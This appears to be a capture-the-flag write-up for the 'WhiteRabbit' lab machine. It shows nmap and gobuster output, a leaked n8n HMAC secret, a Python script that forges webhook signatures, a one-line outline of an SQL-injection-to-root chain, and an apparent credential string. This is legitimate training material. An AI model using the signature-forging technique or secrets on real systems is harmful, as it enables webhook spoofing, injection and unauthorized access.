# User flag
## 1. rustscan
```python
# Nmap 7.94SVN scan initiated Mon Apr  7 08:30:41 2025 as: /usr/lib/nmap/nmap --privileged -vvv -p 22,80,2222 -sC -sV -oN WhiteRabbit 10.129.240.188
Nmap scan report for 10.129.240.188
Host is up, received echo-reply ttl 63 (0.23s latency).
Scanned at 2025-04-07 08:30:48 EDT for 15s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0f:b0:5e:9f:85:81:c6:ce:fa:f4:97:c2:99:c5:db:b3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBslomQGZRF6FPNyXmI7hlh/VDhJq7Px0dkYQH82ajAIggOeo6mByCJMZTpOvQhTxV2QoyuqeKx9j9fLGGwkpzk=
|   256 a9:19:c3:55:fe:6a:9a:1b:83:8f:9d:21:0a:08:95:47 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEoXISApIRdMc65Kw96EahK0EiPZS4KADTbKKkjXSI3b
80/tcp   open  http    syn-ack ttl 62 Caddy httpd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Caddy
|_http-title: Did not follow redirect to http://whiterabbit.htb
2222/tcp open  ssh     syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c8:28:4c:7a:6f:25:7b:58:76:65:d8:2e:d1:eb:4a:26 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKu1+ymf1qRT1c7pGig7JS8MrnSTvbycjrPWQfRLo/DM73E24UyLUgACgHoBsen8ofEO+R9dykVEH34JOT5qfgQ=
|   256 ad:42:c0:28:77:dd:06:bd:19:62:d8:17:30:11:3c:87 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJTObILLdRa6Jfr0dKl3LqWod4MXEhPnadfr+xGSWTQ+
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 2. enum and find subdomain 
```python
┌──(kali㉿kali)-[~]
└─$ gobuster vhost --wordlist /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --url http://whiterabbit.htb
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:          http://whiterabbit.htb
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.0.1
[+] Timeout:      10s
===============================================================
2025/04/07 08:52:59 Starting gobuster
===============================================================
Found: status.whiterabbit.htb (Status: 302) [Size: 32]
```

![[Pasted image 20250407221134.png]]
```python
=> find this in internal wiki

POST /webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d HTTP/1.1
Host: 28efa8f7df.whiterabbit.htb
x-gophish-signature: sha256=cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/json
Content-Length: 81

{
  "campaign_id": 1,
  "email": "test@ex.com",
  "message": "Clicked Link"
}

# find this in json data 
{
      "parameters": {
        "action": "hmac",
        "type": "SHA256",
        "value": "={{ JSON.stringify($json.body) }}",
        "dataPropertyName": "calculated_signature",
        "secret": "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
      },
      "id": "e406828a-0d97-44b8-8798-6d066c4a4159",
      "name": "Calculate the signature",
      "type": "n8n-nodes-base.crypto",
      "typeVersion": 1,
      "position": [
        860,
        340
      ]
    },
```

script to gen signature:
```python
#!/usr/bin/python3
import hmac 
import json 
import hashlib 

secret = b"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS" 

data = { "campaign_id": 1, "email": "test@ex.com", "message": "Clicked Link" }

def gen(data): 
	body = json.dumps(data, separators=(',', ':')).encode('utf-8') 
	signature = hmac.new(secret, body, hashlib.sha256).hexdigest() 
	print("x-gophish-signature:", signature) 
	
gen(data)
```

=> status -> find two subdomain -> find another subdomain -> sqlinjection -> restic -> ssh as bob -> sudo root -> ssh as mophrase -> reverse prng -> root

WBSxhWgfnMiclrV4dqfj